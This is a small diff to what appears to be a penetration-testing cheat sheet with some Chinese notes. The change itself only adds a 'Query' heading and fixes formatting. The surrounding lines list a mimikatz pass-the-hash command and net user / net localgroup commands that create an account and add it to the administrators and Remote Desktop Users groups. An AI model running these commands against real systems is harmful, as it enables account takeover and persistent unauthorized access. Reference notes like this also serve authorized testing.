@@ -75,7 +75,8 @@ sekurlsa::pth /user:administrator /domain:. /ntlm:<ntlm hash>
 ``` net user <帳號名稱> <密碼> /add ```  
 ``` net localgroup administrators <帳號名稱> /add ```  
 ``` net localgroup "Remote Desktop Users" <帳號名稱> /add ```  
-```net localgroup administrators ```  
+## Query  
+``` net localgroup administrators ```  
 ``` net localgroup "Remote Desktop Users ```  
 
 # GDB  
